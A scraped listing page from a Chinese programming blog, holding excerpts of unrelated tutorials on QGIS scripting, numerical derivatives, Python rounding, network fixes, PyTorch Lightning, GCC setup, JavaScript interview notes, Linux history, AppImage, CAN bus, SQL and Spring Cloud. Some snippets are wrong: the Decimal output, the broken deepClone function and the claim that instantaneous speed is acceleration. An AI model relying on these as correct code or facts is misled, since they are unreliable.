获取数据 我们将使用 自然地球的Admin 0-国家数据集。
下载Admin 0-国家shapefile。。
资料来源[NATURALEARTH]
为了方便起见，您可以直接从下面下载包含以上图层的地理包：
ne_global.gpkg
程序 在“ QGIS浏览器面板”中，找到保存下载数据的目录。展开zip或gpkg 条目，然后选择ne_10m_admin_0_countries图层。将图层拖到画布上。
转到处理‣工具箱。单击工具栏中的“脚本”按钮，然后选择“从模板创建新脚本”。
该模板包含处理框架将其识别为处理脚本并管理输入/输出所需的所有样板代码。让我们开始根据需要定制示例模板。首先将类名从更改ExampleProcessingAlgorithm为DissolveProcessingAlgorithm。此名称也需要在createInstance方法中更新。在该类中添加一个文档字符串，以解释该算法的作用。
向下滚动时，您将看到为脚本分配名称，组，描述等的方法。更改返回值的名称的方法是dissolve_with_sum，显示名的方法，组方法和的groupId方法 。将shortHelpString方法的返回值更改为将显示给用户的描述。单击保存按钮。Dissolve with Sumscripts
命名脚本dissolve_with_sum并将其保存在配置文件‣默认‣处理‣脚本文件夹下的默认位置。
现在，我们将定义脚本的输入。模板已经包含INPUT矢量层和OUTPUT层的定义。我们将添加2个新输入，允许用户选择DISSOLVE_FIELD和SUM_FIELD。在该initAlgorithm方法的顶部和下面的代码中添加一个新的导入。单击运行按钮以预览更改。
from qgis.core import QgsProcessingParameterFieldself.addParameter( QgsProcessingParameterField( self.DISSOLVE_FIELD, 'Choose Dissolve Field', '', self.INPUT))self.addParameter( QgsProcessingParameterField( self.SUM_FIELD, 'Choose Sum Field', '', self.INPUT)) 您将看到带有新定义的输入的“用总和溶解”对话框。选择ne_10m_admin_0_countries图层作为Input layer`。由于溶解字段和求和字段都是基于输入层进行过滤的，因此它们将被输入层中的现有字段预先填充。单击关闭按钮。
现在，我们定义了用于在该processAlgorithm方法中处理数据的自定义逻辑。该方法通过了名为的字典parameters。它包含用户已选择的输入。有一些帮助程序方法，使您可以接受这些输入并创建适当的对象。我们首先使用parameterAsSource和parameterAsString方法获得输入。接下来，我们要创建一个特征接收器，在其中写入输出。QGIS3有一个新的类QgsFeatureSink，它是创建可以接受新功能的对象的首选方法。输出仅需要2个字段-一个用于溶解字段的值，另一个用于所选字段的总和。
from PyQt5.QtCore import QVariantfrom qgis.core import QgsField, QgsFieldssource = self.parameterAsSource( parameters, self.INPUT, context)dissolve_field = self.parameterAsString( parameters, self.DISSOLVE_FIELD, context)sum_field = self.parameterAsString( parameters, self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e21ea0697647fbe8225d21ef0216dc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02f8c7af2c4dc127c12a8b0f9f3d1b09/" rel="bookmark">
			深度学习入门（3）神经网络参数梯度的计算方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、数值微分1.导数2.偏导数3.梯度 二、梯度法1.学习率2.神经网络的梯度计算 总结 前言 上一篇文章介绍了神经网络需要达到的最终目标，即使所定义的损失函数值达到尽可能的小。那么，是如何达到使得损失函数的值最小的呢？其实，最常使用的核心大招就是“梯度法”进行参数的更新优化，最终达到使得损失函数最小的目的。本文将介绍神经网络中参数的梯度是如何计算的。
在介绍梯度法之前先简单介绍一下所用到的数值微分方面的数学知识，以帮助理解后续梯度法的计算过程，如果知道这一部分知识的同学，可以直接跳过本文的第一节《数值微分》，直接看第二节《梯度法》的内容即可。
如果喜欢作者欢迎关注公众号：‘阿旭算法与机器学习’，共同学习交流。
一、数值微分 1.导数 导数就是表示某个瞬间的变化量。比如：速度 = 距离 / 时间，如果将距离尽可能的缩短成一个很小的值，这时所使用的时间也是非常小的，这时所计算出来的值即为某一个瞬间的变化量（瞬时速度，数学上也称为加速度）。其数学公式如下：
其中：左边的符号df(x) / dx 表示函数f（x）关于x的导 数，即f（x）相对于x的变化程度。上式的导数含义是，x的“微小变化”将导致函数f（x）的值在多大程度上发生变化。其中，表示微小变化的 h无限趋近0，表示为 limh-&gt;0 .
python实现的代码如下：
def numerical_diff(f, x): """ :param f: f为x的为函数表达式 :param x: 函数f在值x处求导数 :return: 返回函数f在x处的导数值 """ h = 1e-5 # h取一个很小的值 return (f(x+h) - f(x)) / (h) 但是通常为了更好的减小导数的误差，我们采用中心差分的方式进行导数计算，计算函数f在(x + h)和(x - h)之间的差分。因为这种计算方法以x为中心，计算它左右两边的差分，所以也称为中心差分（而(x + h)和x之间的差分称为前向差分）。
def numerical_diff(f, x): h = 1e-5 # h取一个很小的值 return (f(x+h) - f(x-h)) / (2 * h) 下图为真的导数（真的切线）和 数值微分（近似切线）的值比较：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02f8c7af2c4dc127c12a8b0f9f3d1b09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb924891271dfc5a52e59f680be79215/" rel="bookmark">
			python正确保留一位小数的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python正确保留一位小数的方法（可扩展至多位） 方法1：用round函数
a=12.34567889
round(a,1)=12.3
#保留一位小数
round(a,2)=12.35
#保留二位小数
方法2：格式化输入
a=12.34567889
print（“%.1f”%a)
#保留一位小数
print（“%.3f”%a)
#保留三位小数
print（“%.4f”%a)
#保留四位小数
方法3：引入decimal函数
from decimal import Decimal
a=134.5657768
t=Decimal(“134.5657768”).quantize(Decimal(“0.0”))
print(t)
#输出结果：1134.5
学习笔记
不完全，待补充
参考于
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d331c2c46ee8a54047af05418f71ca7a/" rel="bookmark">
			电脑修改ip后无法上网_电脑突然无法上网不用急，一分钟教你快速解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在日常使用电脑的过程中，常会碰到电脑突然上不了网的情况，其实这个问题很简单，按照以下的步骤自己也可轻松快速解决。
第一步、检查网络运行是否正常，我们先检查一下路由器，猫等网络设备是否运行正常，各指示灯是否正常。如果网络正常，那就是电脑的问题；如果网络不正常，那就可能是网络线路的问题，联系你的网络运营商解决。
第二步、检查网卡驱动，鼠标右键点击【计算机】—选择【属性】—打开【设备管理器】—查看设备管理器是否有黄色的感叹号，有的话说明是网卡驱动的问题，你需要安装或更新网卡驱动。如果你的电脑是品牌电脑，建议上官网下载对应型号的官方驱动安装解决。
第三步、重启网卡，如果安装了驱动后，电脑连接还是不成功。我们可以尝试重启网卡让电脑重新检索、获取网络信号，以便解决问题。方法如下：鼠标右键点击【网络】—在左侧选择【更改适配器设置】—在【本地连接】上鼠标右键选择【禁用】—然后再右键选择【启用】。
第四步、检查网络获取方式，如下面步骤都依然无法连接上网络，这时我们需要考虑是否网络设置的问题。同第三步打开“本地连接”，在它上面鼠标右键选择【属性】—选择【Internet协议版本(TCP/IPV4)】的属性，点选【自动获得IP地址】和【自动获得DNS服务器地址】两个选项。
第五步、如果设置了以上四步，仍旧连接不上网络，那么也许和DNS缓存有关。这时我们尝试清除DNS缓存。打开【运行】,在运行窗口输入“CMD”打开命令提示窗口，输入代码“ipconfig/flushdns”即可。
六、重置winsock，一般情况下，做到第五步，电脑都能上网了。如果你的电脑仍旧不能上网，那么你可以尝试重置Winsock目录。同第五步打开“命令提示窗口”并输入代码“netsh winsock reset”，然后根据提示重启电脑。
以上设置方法以WIN7操作系统为例，WIN10的操作方法大同小异。动手能力差的小伙伴们可以用杀毒软件自带的工具进行修复。大体方法是在杀毒软件主界面选择【工具中心】找到【断网急救箱】选择【全面诊断】随后一键修复，重启电脑即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/215d013e381dbccdf96459b0a7bb0549/" rel="bookmark">
			itext 生成pdf 输出特殊符号_JAVA提取PDF内容及转换PDF为图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天给大家分享一下使用java处理pdf文件，包括提取pdf文本、提取pdf图片、pdf转图片三种操作。
主要使用到的库是apache开源的pdfbox，目前最新版本是2.0.x，网上的资料一般是1.8.x或者2.0.x的。如果是要处理pdf，推荐使用。如果是要生成pdf，推荐使用itext，有网友说pdfbox对中文支持不好，我还没尝试，只用过itext还是很棒的。
官网对pdfbox的介绍：
接下来介绍如何使用pdfbox。
首先你肯定要创建maven项目，添加pom依赖，这里一共用到四个依赖：
然后创建工具类，写方法就可以(以下只粘贴部分代码，具体内容可查看文章最后给出的分享链接)。
提取pdf中的文本 提取pdf中的图片 pdf转图片 将每一页pdf转换成一张图片，这个很实用。
为了页面更美观，所以以上代码都以图片形式展示，如果需要查看源文件，可以去github地址：https://github.com/zhouyc/sharecode/blob/master/com/zyc/util/PdfTest.java
下次再给大家分享如何使用itext生成pdf文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8799c374a92a1e2cdbd3b73098fd47c/" rel="bookmark">
			pytorch-lightning 设置为每个训练 epoch 结束都保存 checkpoint
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pytorch-lightning 设置为每个训练 epoch 结束都保存 checkpoint ModelCheckpoint
pytorch-lightning 中保存断点用的是回调函数 ModelCheckpoint，并且必须是在验证循环结束后才会保存。这样的方式不适合于一些特殊任务，例如 Transformer 结构下的语音识别模型一般都需要 average 最后10-20 个 epoch 的模型权重。而且对于自回归模型来说进行一次真正的（即不提供真实标签）验证需要的时间较长，实际上整个训练过程中可能并没有验证过程。
SaveCheckpoint
重写 ModelCheckpoint，实现每个训练 epoch 结束都保存 checkpoint
class SaveCheckpoint(ModelCheckpoint): """save checkpoint after each training epoch without validation. if ``last_k == -1``, all models are saved. and no monitor needed in this condition. otherwise, please log ``global_step`` in the training_step. e.g. self.log('global_step', self.global_step) :param last_k: the latest k models will be saved. :param save_weights_only: if ``True``, only the model's weights will be saved, else the full model is saved.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c8799c374a92a1e2cdbd3b73098fd47c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97e7c098ffd5678989426370f86ccf6f/" rel="bookmark">
			使用 Android Studio 开发工具创建一个 Android 应用程序，并在 Genymotion 模拟器上运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求说明： 使用 Android Studio 开发工具创建一个 Android 应用程序，并在 Genymotion 模拟器上运行
实现步骤： 打开 Android Studio，创建一个 Android 应用程序
设置应用程序的名称等相关信息
启动 Genymotion 模拟器
运行 Android 应用程序，查看运行结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb38f94da7037813da46b1d3cdc6c081/" rel="bookmark">
			gcc g&#43;&#43;环境变量设置_设置C&#43;&#43;开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++是一种通用编程语言，它具有命令式，面向对象和通用编程功能。
C++可在Windows，Linux，Unix，Mac等许多平台上运行。在我们开始使用C ++进行编程之前。我们将需要在本地计算机上设置一个环境，以成功编译和运行我们的C ++程序。如果您不想设置本地环境，也可以使用在线IDE来编译程序。
使用在线IDE
IDE代表集成开发环境。IDE是一个软件应用程序，它为计算机程序员提供了开发软件的便利。您可以使用许多在线IDE来轻松地编译和运行程序，而无需设置本地开发环境。
ide.geeksforgeeks.org是GeeksforGeeks提供的一种IDE。您可以单击“Run on IDE”按钮以运行程序。
#include using namespace std; main() { cout &lt;&lt; "Learning C++ at GeekforGeeks"; } 设置本地环境
为了在本地计算机上设置自己的个人开发环境，您需要安装两个重要的软件：
1. 文本编辑器：文本编辑器是用于编辑或编写文本的程序类型。我们将使用文本编辑器键入C ++程序。文本文件的常规扩展名是(.txt)，但是包含C ++程序的文本文件应以“ .CPP”或“ .C”扩展名保存。以扩展名“ .CPP”和“ .C”结尾的文件称为源代码文件，它们应该包含以C ++编程语言编写的源代码。这些扩展名有助于编译器识别该文件包含C ++程序。
在开始使用C ++进行编程之前，必须已安装文本编辑器才能编写程序。
2. C++编译器：安装了文本编辑器并键入扩展名并将其保存在扩展名为“ .CPP”的文件中后，您将需要C ++编译器来编译此文件。 编译器是一种计算机程序，可以将高级语言转换为机器可理解的低级语言。 换句话说，可以说它会将以编程语言编写的源代码转换为计算机可以理解的另一种计算机语言。 为了编译C ++程序，我们需要一个C ++编译器，它将C ++编写的源代码转换为机器代码。
以下是有关在不同平台上设置编译器的详细信息。
Linux安装
我们将在Linux上安装GNU GCC编译器。要在Linux机器上安装并使用GCC编译器，请按照以下步骤操作：
1.您必须首先在Linux终端窗口中运行以下两个命令：
sudo apt-get updatesudo apt-get install GCC 此命令将在您的系统上安装GCC编译器。 您也可以运行以下命令：
sudo apt-get install build-essential 该命令将安装编译和运行C ++程序所需的所有库。
2.完成上述步骤后，应检查系统中是否正确安装了GCC编译器。为此，您必须在Linux终端上运行以下命令：
g++ --version 3.如果您已完成上述两个步骤而没有任何错误，则说明您的Linux环境已建立并准备好用于编译C ++程序。在进一步的步骤中，我们将学习如何使用GCC编译器在Linux上编译和运行C ++程序。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb38f94da7037813da46b1d3cdc6c081/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/650e509726d4e77c86c1834a7aec4823/" rel="bookmark">
			js面经总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、js基础语法 1.1变量类型和计算 1.1.1变量类型 （1）值类型vs引用类型
值类型：
指向值本身
undefine boolean string number symbol(表示独一无二的值，最大的用法是用来定义对象的唯一属性名)
引用类型：
变量指向值的存储地址
数组 对象 null（指向空地址） 函数 （2） typeof运算符
作用：识别出所有的值类型、函数、判断是否是引用类型（不可再细分）
类型：undefine/string/boolean/number/symbol/object/function
（3）深拷贝
浅拷贝：引用类型只是拷贝值地址
&lt;script&gt; const obj = { age:20, name:'hhh', address:{ city:'beijing', }, arr:['a','b','c'] } function deepClone(obj={}){ if(typeof obj != 'object' || obj==null){ return obj } let result if (obj instanceof Array){ result = [] }else{ result = {} } for(key in obj){ if(obj.hasOwnPropety){ result[key] = deepClone[obj[key]] } } } &lt;/script&gt; 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/650e509726d4e77c86c1834a7aec4823/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bf6445256d18d81e16c9962ff0a4b89/" rel="bookmark">
			ctf之linux基础和网络基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ctf之linux基础和网络基础 Linux应用
Linux是一个开源、免费的操作系统，其稳定性、安全性、处理多并发已经得到业界的认可，目前很多中型、大型甚至巨型项目都在使用Linux
使用Linux的部分公司
厂商:网宿/深信服/绿盟/…
互联网公司:新浪/京东/淘宝/…
运营商:移动/电信/联通/…
Linux相关岗位
主机工程师·
系统工程师
运维工程师·
安全工程师…
如何学习Linux
先建立一个整体框架，然后细节用什么，再学什么
计算机是一门“做中学”的学科，不是会了再做，而是做了才会
先know how，再know why
学习Linux系统是在琢磨别人怎么做
适当的囫囵吞枣
Linux诞生背景
1991年9月17日，这是计算机发展史上值得纪念的一天，Torvalds将自己的开发的系统源程序完整地上传
到FTP服务器上，供大家下载测试。本来，Torvalds想用“Freax”这个名字，但AriLemke更喜欢开发时用的代号“Linux”，根据Ari Lemke的建议，Torvalds将这个具有划时代意义的操作系统命名为: Linux,由于Torvalds认为这个系统还很不完善，因此谦虚地将其命名为:0.01版。Linux诞生后的几个月里,Torvalds在不断地听取试用者的反馈的同时，仍然潜心于不断地改进程序，使其功能更强大、性能更稳定。到了1991年底，已经陆续推出了0.02版、0.03版、0.1版、0.11版。
尽管当时Torvalds已欠了大约五千美元的学生货款，但在开始发布源代码时，在开始发布源代码时，他就制定了这样的版权规则:
·任何人可以免费使用该操作系统,但不得将其作为商品出售;
·任何人可以对该操作系统进行修改，但必须将其修改以源代码的形式公开;·如果不同意以上规定，任何人无权对其进行复制或从事任何行为。
显然,Torvalds在Linux诞生时确定的版权规则体现了开放源代码运动的基本思想，在Linux诞生的初期有
力地促进了它的传播、发展、完善，吸引网络上越来越多的程序高手(这些人常常被称作黑客）加入到Linux的测试、开发中来。但是，由于这里的版权规则禁止销售Linux，实际上又阻碍了Linux的推广、传播,因为软件分发需要时间、精力、物质、资金的投入，如果一味禁止分发者获得回报，必然阻碍Linux的推广和传播，使得Linux最终局限在计算机软件爱好者的小范围内传播，无法到达普通计算机用户手中。
不久，Linux的机遇又出现了。Torvalds有机会聆听了自由软件运动之父Richard Stallman(理查德·斯托
曼，生于1953年)的一次演讲，促使他考虑转向GUN的GPL。Richard Stallman是自由软件运动的精神领袖、GNU计划以及自由软件基金会(Free Software Foundation)的创立者、著名黑客。他最大的成就是为自由软件运动创立了道德、政治以及法律框架，因而被誉为当今自由软件的斗士、伟大的理想主义者。GNU计划是由Richard Stallman在1983年9月27日公开发起的，它的目标是**创建一套完全自由的操作系统。**为保证GNU软件可以自由地“使用、复制、修改和发布”，所有GNU软件必须遵守GNU通用公共许可证(GNU General Public License，简称GNU GPL)，GNU GPL创造性地提出了“反版权”(即Copyleft)的概念，这是一个不同于商业软件的“版权所有”^(即Copyright)的法律概念，GNU GPL并不是为了否认版权，也不禁止分发软件时收取费用或取得利润。其核心思想是任何人发布一个遵守GNU GPL的软件时,不管是收费的还是免费的，都必须将发布者具有的一切权利给予软件的接受者，必须保证软件接受者能同时收到或通过其他途径得到源程序，并且将GNU GPL附加在软件的版权声明中，使软件接受者知道自己有这样的权利。GNU GPL本身也是受法律保护的版权声明。
从0.12版本开始，Torvalds把GNU GPL作为Linux的版权声明，把Linux奉献给了自由软件，奉献给了GNU,从而铸就了包括Linux在内的自由软件今天的辉煌。从此，Linux走上迅速发展的康庄大道。
Unix与Linux联系与区别
联系
Linux就是模仿Unix界面和功能的操作系统，但是源代码和Unix一点关系都没有。换句话讲，Linux不是Unix，但像Unix
Unix的历史久于Linux,Linux的思想源于Unix
区别
系统大多是与硬件配套的，而Linux则可运行在多种硬件平台上
Unix有些版本比如aix,hp-ux是商业软件是闭源的(不过solaris,*bsd等Unix都是开源的)，而Linux是自由软件，免费、公开源代码的
最大的不同: Linux是开发源代码的自由软件，而Unix是对源代码实行知识产权保护的传统商业软件
Linux四大组成部分
Linux内核
内核是系统的核心，是运行程序和管理的核心程序如进程管理，进程间的通讯调用等
Linux Shell
Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口
Linux文件系统
是文件存放在磁盘等存储设备上的组织方法，linux是开放性的，能够支持多种异构的文件系统，如ext2,ext3,fat,vfat(fat32),ISO9660,nfs等
Linux应用系统
标准的linux系统都有一整套成为应用程序的程序集，包括文本编辑器、办公套件、数据库等
linux文件系统的一般结构
Vmware基础
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bf6445256d18d81e16c9962ff0a4b89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8dae30486a9df6dff15f0905d929bfcd/" rel="bookmark">
			appimage文件怎么安装_Linux应用安装有福啦 ！和苹果Mac一样方便的单文件安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自从用了苹果macbook，和windows基本上就再见了，苹果系统的稳定性太出色了，使用完合上盖子放十天半个月的没一点问题，一叫就醒，一醒就能接着工作，windows系统不行，要么睡了叫不醒，要么叫醒后电脑突然弹出个错误提示，甚至还可能蓝屏。苹果系统的软件安装比起Windows系统来，可以说是一种享受，要么直接拖进应用文件夹，要么双击下一步就安装完成，从未遇到依赖性问题和夹带私货的情况，加上Home brew的支持，安装更多软件一条命令就可以搞定，这点和Debian Linux的apt、RedHat Linux的yum一样好用。 1、倚天剑一出，谁与争锋！
linux在桌面市场一直不温不火，一个重要原因就是软件安装麻烦，同一个软件必须适配多个发行版，导致出现各种安装包，ubuntu和centos安装包格式不同，slackware和arch linux安装包格式也不同，造成软件应用发行的额外负担，给用户选择带来困扰。此时，出现了一统江湖的安装包格式AppImage，几乎支持所有的Linux发行版，软件安装和苹果Mac系统一样的方便好用。 2、安装即是运行，就这么方便 AppImage格式安装包不需要特别配置，也不需要用户处理复杂的依赖包关系，下载后只要用户有可执行权限，双击运行，到手即用。 这个一统江湖的软件应用安装包格式真正实现了一次打包，到处运行，目前支持的Linux发行版有：Arch Linux、Centos 、Debian、Fedoral、Suse 、RHEL和Ubuntu，涵盖了主流发行版，不再为各种不同发行版的软件安装环境、包依赖关系而发愁，更不需要编译源代码和调试安装脚本。 3、对国产发行版deepin支持良好 以下载神器Motrix为例，它的Linux安装包采用了AppImage格式，将包下载后双击运行，但是却没有任何反应，为了查找原因，我在终端下手动运行Motrix应用，出现报错信息如下： 大意是权限配置不对，根本原因在于Debian系统默认是禁用非特权用户命名空间的，目的是为了防止内核受漏洞攻击，类似于Windows的内核执行保护，此时，输入并运行如下命令开启非特权用户命名空间：
sudo sysctl kernel.unprivileged_userns_clone=1 这时，再双击运行下载好的Motrix应用就可以顺利打开了。
但是，为了安装期间，应再输入并运行以下命令，防止内核受到漏洞攻击：
sudo sysctl kernel.unprivileged_bpf_disabled=1 这样以下，就可以开心愉快地使用AppImage安装包格式啦。现在Chrome和FireFox浏览器、GIMP平面设计软件、LibOffice办公软件等常用Linux应用都发布了相应的AppImage安装包，以后会有越来越多的应用使用这种方便的安装包格式，Linux桌面应用蓬勃发展是指日可待了！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41d08f489d78440ceaee6fe938619fd5/" rel="bookmark">
			can test 接收报文_Can协议规范
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 CAN为串行通讯协议，能有效地支持具有很高安全等级的分布实时控制。
CAN的应用范围很广，从高速的网络到低价位的多路接线都可以使用CAN。
在汽车电子行业里，使用CAN连接发动机控制单元、传感器、防刹车系统、等等，其传输速度可达1Mbit/s。同时，可以将CAN安装在卡车本体的电子控制系统里，诸如车灯组、电气车窗等等，用以代替接线配线装置。
技术规范的目的是为了在任何两个CAN仪器之间建立兼容性。可是，兼容性有不同的方面，比如电气特性和数据转换的解释。
为了达到设计透明度以及实现灵活性，根据ISO/OSI参考模型，CAN 2.0规范细分为以下不同的层次：数据链路层和物理层(如图所示)。 在以前版本的CAN规范中，数据链路层的LLC子层和MAC子层的服务及功能分别被解释为“对象层”和“传输层”。
逻辑链路控制子层(LLC)的作用范围如下：
为远程数据请求以及数据传输提供服务。确定由实际要使用的LLC子层接收哪一个报文。为恢复管理和过载通知提供手段。 MAC子层的作用主要是传送规则，也就是控制帧结构、执行仲裁、错误检测、出错标定、故障界定。位定时的一些普通功能也可以看作是MAC子层的一部分。
物理层的作用是在不同节点之间根据所有的电气属性进行位的实际传输。
CAN具有以下的属性：
报文的优先权保证延迟时间设置灵活时间同步的多点接收系统内数据的连贯性多主机 错误检测和错误标定只要总线一处于空闲，就自动将破坏的报文重新传输将节点的暂时性错误和永久性错误区分开来，并且可以自动关闭由OSI参考模型分层CAN结构的错误的节点。 依据ISO/OSI参考模型的层结构具有以下功能:
物理层定义信号是如何实际地传输的，因此涉及到位时间、位编码、同步的解释。技术规范没有定义物理层的驱动器/接收器特性，以便允许根据它们的应用，对发送媒体和信号电平进行优化。MAC子层是CAN协议的核心。它把接收到的报文提供给LLC子层，并接收来自LLC子层的报文。MAC子层负责报文分帧、仲裁、应答、错误检测和标定。MAC子层也被称作故障界定的管理实体监管。此故障界定为自检机制，以便把永久故障和短时扰动区别开来。LLC子层涉及报文滤波、过载通知、以及恢复管理。 嵌入式基地：Can协议基本概念​zhuanlan.zhihu.com 免费分享海量学习资源​mp.weixin.qq.com 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24443c8f2ed66a4ff744227536258315/" rel="bookmark">
			c&#43;&#43;代码表白_520表白代码集合C版、C&#43;&#43;版、Python般、魔性表白图版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		!!!纯魔性表白图，赶紧拿去表白吧!!!
本代码搜集自网络，仅供娱乐。如果觉得这里的表白代码简陋，可以自己进行改造。需要声明的是，如果拿这里的代码去表白失败，或者表白被打，本公众号不负任何责任哦。不过你可以基于本代码，再加工，加入自己的创意和心意，或许可以赢得她的芳心哦。
C++版控制台画出心形的代码实现：
1.效果图
2.C++表白代码如下：
#include "stdafx.h"
#include using namespace std;
int main(){
int i, j;
cout &lt;&lt; " ****** *******" &lt;&lt; endl;
cout &lt;&lt; " xxxlovexxx xxxlovexxx" &lt;&lt; endl;
cout &lt;&lt; " ************ *************" &lt;&lt; endl;
for (i = 0; i &lt; 3; i++)
{
for (j = 0; j &lt; 29; j++)
cout &lt;&lt; "*";
cout &lt;&lt; endl;
}
for (i = 0; i &lt; 7; i++)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24443c8f2ed66a4ff744227536258315/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/768cec07605a55230508b03493017d79/" rel="bookmark">
			html游戏源码大全_万字解析微前端、微前端框架qiankun以及源码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(给前端大全加星标，提升前端技能)
作者：晒兜斯
https://segmentfault.com/a/1190000022275991
本文将针对微前端框架 qiankun 的源码进行深入解析，在源码讲解之前，我们先来了解一下什么是 微前端。
微前端 是一种类似于微服务的架构，它将微服务的理念应用于浏览器端，即将单页面前端应用由单一的单体应用转变为多个小型前端应用聚合为一的应用。各个前端应用还可以独立开发、独立部署。同时，它们也可以在共享组件的同时进行并行开发——这些组件可以通过 NPM 或者 Git Tag、Git Submodule 来管理。
qiankun(乾坤) 就是一款由蚂蚁金服推出的比较成熟的微前端框架，基于 single-spa 进行二次开发，用于将 Web 应用由单一的单体应用转变为多个小型前端应用聚合为一的应用。(见下图)
那么，话不多说，我们的源码解析正式开始。
初始化全局配置 - start(opts) 我们从两个基础 API - registerMicroApps(apps, lifeCycles?) - 注册子应用 和 start(opts?) - 启动主应用 开始，由于 registerMicroApps 函数中设置的回调函数较多，并且读取了 start 函数中设置的初始配置项，所以我们从 start 函数开始解析。
我们从 start 函数开始解析(见下图)：
我们对 start 函数进行逐行解析：
第 196 行：设置 window 的 __POWERED_BY_QIANKUN__ 属性为 true，在子应用中使用 window.__POWERED_BY_QIANKUN__ 值判断是否运行在主应用容器中。
第 198~199 行：设置配置参数(有默认值)，将配置参数存储在 importLoaderConfiguration 对象中；
第 201~203 行：检查 prefetch 属性，如果需要预加载，则添加全局事件 single-spa:first-mount 监听，在第一个子应用挂载后预加载其他子应用资源，优化后续其他子应用的加载速度。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/768cec07605a55230508b03493017d79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db93111bce822eec4675eb9486dd9e9a/" rel="bookmark">
			oracle 分组_sql 分组语句group by
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		聚合函数如sum(),max()等，通常需要结合分组语句group by 使用 GROUP BY 语句 GROUP BY 语句用于结合合计函数，根据一个或多个列对结果集进行分组。 语法： SELECT column_name, aggregate_function(column_name)FROM table_nameWHERE column_name operator valueGROUP BY column_name GROUP BY 实例
student表查询结果如下：
1、查询每个人的总分,语句如下：
select name 姓名,sum(score) 个人总分 from student group by name 输出结果：
2、按课程汇总查询，语句如下：
select name 姓名,max(case course when '语文' then score else 0 end ) 语文,max(case course when '数学' then score else 0 end ) 数学,max(case course when '英语' then score else 0 end ) 英语,sum(score) 总成绩from studentgroup by name 输出结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db93111bce822eec4675eb9486dd9e9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e574e715c19585c78dd4eeed7dd97e0/" rel="bookmark">
			spring cloud微服务实战 pdf_SpringCloud Alibaba微服务实战 - 基础环境准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本系列文章使用SpringCloud Alibaba一步一步构建你的微服务架构体系，这是第一篇“基础环境准备”，欢迎大家持续关注！
Springcloud Aibaba现在这么火，我一直想写个基于Springcloud Alibaba一步一步构建微服务架构的系列博客，终于下定决心从今天开始本系列文章的第一篇 - 基础环境准备
本系列文章内容主要基于三个微服务：用户服务AccountService，订单服务OrderService，产品服务ProductService
用到的组件有：
注册中心、配置中心 Nacos限流 Sentinel分布式事务 Seata网关 SpringCloud Gateway认证授权 Spring Cloud Oauth2docker、docker-compose 由于用到的组件相对较多，部署会很繁琐，最关键的是没有资源服务器，所以在开发过程中我会逐渐将一些组件使用docker-compose部署。
本篇内容就是使用Dokcer-compose部署Nacos，Sentinel，Mysql，作为后面的系列文章的基础环境。
如果你对docker或者docker-compose不是很熟悉的话，你可以翻看我之前的两篇文章，看完后相信你能很快入手。
